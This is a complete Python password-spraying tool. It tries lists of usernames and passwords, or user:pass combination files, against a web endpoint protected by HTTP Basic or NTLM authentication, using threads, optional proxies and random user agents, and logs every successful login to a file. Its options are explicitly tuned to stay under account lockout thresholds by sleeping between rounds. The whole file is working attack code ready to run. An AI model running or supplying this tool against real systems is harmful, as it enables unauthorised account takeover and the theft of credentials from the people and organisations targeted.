#!/usr/bin/env python3

import requests
import requests_random_user_agent
from requests_ntlm import HttpNtlmAuth

from base64 import b64encode as be, b64decode as bd
import argparse
from time import sleep, time
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from multiprocessing import Pool


def check_creds(opts):
    url, domain, username, password, authtype, proxies, track_time = opts

    headers = {}
    if authtype == "ntlm":
        if domain:
            auth = HttpNtlmAuth(f"{domain}\\{username}", password)
        else:
            auth = HttpNtlmAuth(username, password)

        # headers = {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="}
        headers = {"X-Force-NTLM": "true"}
    else:
        if domain:
            auth = (f"{domain}\\{username}", password)
        else:
            auth = (username, password)

    try:
        timeA = time()
        res = requests.get(
            url,
            verify=False,
            proxies=proxies,
            auth=auth,
            headers=headers,
            allow_redirects=False,
        )
        timeB = time()
        elapsedTimeMs = round((timeB - timeA) * 1000, 2)

        if res.status_code != 401 and res.status_code != 403:
            if track_time:
                print(f"Success! {username}:{password}  - {elapsedTimeMs}ms")
            else:
                print(f"Success! {username}:{password}")

            return username, password

        elif track_time:
            print(f"Fail:  {username}:{password}  - {elapsedTimeMs}ms")
    except Exception as e:
        print(f"Error occurred with {username}:{password}: {e}")


if __name__ == "__main__":
    args = argparse.ArgumentParser()

    args.add_argument(
        "-u", "--usernames", help="List of usernames to attack"
    )
    args.add_argument(
        "-p", "--passwords", help="List of passwords to try"
    )
    args.add_argument(
        "-c", "--userpass", help="File containing user/password combinations"
    )
    args.add_argument(
        "-d",
        "--domain",
        help="Domain name to append. If not included, then domains will be assumed to be in username list.",
        required=False,
    )
    args.add_argument("-U", "--url", help="URL to authenticate against", required=True)
    args.add_argument(
        "-a",
        "--attempts",
        help="Number of attempts to try before sleeping. If your lockout policy is 5 attempts per 10 minutes, then set this to like 3",
        type=int,
        default=1,
    )
    args.add_argument(
        "-i",
        "--interval",
        help="Number of minutes to sleep between attacks. If your lockout policy is per 10 minutes, set this to like 11",
        type=int,
        default=120,
    )
    args.add_argument(
        "--authtype",
        help="Authentication type - basic or ntlm. Note: You can't use a proxy with NTLM",
        choices=["ntlm", "basic"],
        default="basic",
    )
    args.add_argument("--proxy", help="Proxy server to route traffic through")
    args.add_argument("--threads", help="Number of threads", type=int, default=1)
    args.add_argument(
        "--output", help="File to write successful pairs to", default="success.log"
    )
    args.add_argument(
        "--add_response", help="Add response times to output", action="store_true"
    )
    opts = args.parse_args()

    if opts.proxy and opts.authtype == "basic":
        proxies = {"http": opts.proxy, "https": opts.proxy}
    else:
        proxies = {}

    if opts.userpass:
        print("Running in user/pass mode")

        data = open(opts.userpass).read().split('\n')

        users = {}

        for d in data:
            if d:
                user, pw = d.split(':', 1)

                if user not in users:
                    users[user] = []
                if pw not in users[user]:
                    users[user].append(pw)

        mx = 0
        for u, p in users.items():
            if len(p) > mx:
                mx = len(p)

        attack_sets = []
        for i in range(mx):
            attack_sets.append([])

        for u, pw in users.items():
            for i, p in enumerate(pw):
                attack_sets[i].append(
                    (
                        opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response
                    )
                )
        print(f"{mx} Attack Sets Created from User Pass file")
        i = 0
        current = 1
        total = mx
        f = open(opts.output, "a")
        f.write(f"New run: {str(datetime.now())}\n")
        print(f"New password spraying run")
        print(f"Spraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
        print(f"URL: {opts.url}")

        for attempts in attack_sets:
            i += 1

            print(f"{str(datetime.now())}: Attempting set ({current}/{total})")
            
            with Pool(opts.threads) as p:
                for s in p.imap_unordered(check_creds, attempts):
                    if s:
                        f.write(f"{s[0]}:{s[1]}" + "\n")
                        f.flush()

            if i == opts.attempts:
                print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
                sleep(opts.interval * 60)

                i = 0

            current += 1
    else:
        usernames = [u for u in open(opts.usernames).read().split("\n") if u]

        passwords = [p for p in open(opts.passwords).read().split("\n") if p]

        i = 0
        current = 1
        total = len(passwords)
        f = open(opts.output, "a")
        f.write(f"New run: {str(datetime.now())}\n")
        print(f"New password spraying run")
        print(f"Spraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
        print(f"URL: {opts.url}")
        for p in passwords:
            i += 1

            print(f"{str(datetime.now())}: Attempting {p} ({current}/{total})")
            attempts = [
                (opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response)
                for u in usernames
            ]
            with Pool(opts.threads) as p:
                for s in p.imap_unordered(check_creds, attempts):
                    if s:
                        f.write(f"{s[0]}:{s[1]}" + "\n")
                        f.flush()

            if i == opts.attempts:
                print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
                sleep(opts.interval * 60)

                i = 0

            current += 1
